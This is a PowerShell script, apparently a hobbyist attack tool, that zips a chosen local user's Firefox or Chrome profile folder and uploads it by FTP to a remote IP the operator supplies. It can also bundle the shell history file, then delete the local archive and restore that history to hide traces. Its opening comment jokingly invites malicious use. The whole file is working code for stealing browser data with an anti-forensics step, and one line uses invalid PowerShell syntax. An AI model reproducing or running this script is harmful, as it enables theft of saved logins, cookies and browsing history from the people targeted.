#Do not use for malicious purposes 
#If you do you, you will definitely get caught so maybe do use for malicious purposes if you already where going to ? 
class Grab 
{
[IPAddress]$IP
[int]$PORT
[char]$browser
[String]$Path
[String]$location
[String]$targetUser
[String]$rand
[boolean]$clean
[String]$histLoc
[String]$historyBackup
[void]build(){
while($true){
Write-Host "Configuring Remote Host info"
try{
[IPAddress]$this.IP = (Read-Host "Ip of host to send data too").Trim()
break
}
catch{Write-Host "Please put ipv4 address nothing else (*-*)"}
}
while ($true){
try{
$this.PORT = Read-Host "Port to send data to on remote host"
break
}
catch{Write-Host "int only please :="}
}
try{
$this.browser = Read-Host "Which browser do you want to extract data for?`n`Firefox [F]`n`Chrome  [C]"
}
catch{"Only one char please >.<"}
while(($this.browser -ne "F") -and ($this.browser -ne "C")){
 try{
 [char]$this.browser = Read-Host "INVALID SYNTAX`n`Which browser do you want to extract data for?`n`Firefox [F]`n`Chrome [C]"
 }
 catch{Write-Host "Only one char please >.<"}
}
while ($true){
    $userprof = Get-LocalUser
    $this.targetUser = Read-Host "Which user's chrome profile would you like to grab?"
    if ($userprof.Name -contains $this.targetUser){break}
    else {Write-Host ("ERR Please select valid Username `n`List of valid users:`n"+$userprof.Name)}
    }
if ($this.browser -eq "F"){
    $this.Path = "/Users/"+$this.targetUser+"/AppData/Roaming/Mozilla/Firefox/"
}
else {
    $this.Path = "/Users/"+$this.targetUser+"/AppData/Local/Google/Chrome"
}
while($true){
try{
    [char]$perhaps = Read-Host "Do a really bad cleanup after running?`n`Y/N"
    $this.clean = $perhaps == 'Y' or $perhaps == 'y'
    if($this.clean){
    $this.histLoc = $(Get-PSReadLineOption)."HistorySavePath"
    #Terrible, but ehhhhh its okay less file writing itll be fine just throw it in memory hope it isnt huge Yeah
     Write-Host "If it hangs right now don't run cleaner history too big"
     $this.historyBackup = $(Get-Content $this.histLoc | Out-String)
     break
    } 
}
catch{Write-Host "Only one char please /<>_<>\"}
}
}

[void]sendData(){
    Write-Host "Setting up ftp connection`n`Remeber to start ftp server with write permissions using `n`python -m pyftpdlib -w"
    $userBean = Read-Host "Remote ftp username"
    $cred = Read-Host "Remote ftp password"
    $remote = "ftp://"+$this.IP+":"+$this.PORT.ToString()+"/"+$this.rand+".zip"

    Write-Host "Shoutout Thomas Maurer for powershell ftp file upload guide!!"
    Write-Host "Creating ftp request obj"
    $Request = [System.Net.FtpWebRequest]::Create($remote)
    $Request = [System.Net.WebRequest]$Request
    $Request.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
    $Request.Credentials = New-Object System.Net.NetworkCredential($userBean, $cred)
    $Request.UseBinary = $true
    $Request.UsePassive = $true
    
    Write-Host "Reading File"
    $Content = gc -en byte $this.location
    $Request.ContentLength = $Content.Length

    Write-Host "Getting Stream Request"
    $boing = $Request.GetRequestStream()
    $boing.Write($Content, 0, $Content.Length)

    Write-Host "Success!! Cleaning up"

    $boing.Close()
    $boing.Dispose()


}

[void]compressor(){
Write-Host "Creating Archive of app data"
$this.rand = Get-Random -Minimum 1000000 -Maximum 9999999
$this.location = $env:USERPROFILE + "\Music\" +$this.rand+".zip" 
try{
if ($this.clean){
Compress-Archive -CompressionLevel Fastest -Path $this.Path, $this.histLoc -DestinationPath $this.location
}
else{
Compress-Archive -CompressionLevel Fastest -Path $this.Path -DestinationPath $this.location
}
Write-Host ("Archive saved to " + $this.location)
}
catch {"Error creating archive of data check perms? Check Error with writing to tmp?"}
}
[void]cleaner(){
Remove-Item $this.location
$this.historyBackup | Out-File -FilePath $this.histLoc
Write-Host "I feel like this shouldn't really make you feel better but I mean its done, hope you are happy"
}
}
#[String]$fPath = "C:\Program Files (x86)\Mozilla Firefox\"
#[String]$cPath = "C:\Users\$user\AppData\Local\Google\Chrome\User Data"

$grabIt = [Grab]::new()
$grabIt.build()
$grabIt.compressor()
$grabIt.sendData()
if ($grabIt.clean){
$grabIt.cleaner()
}


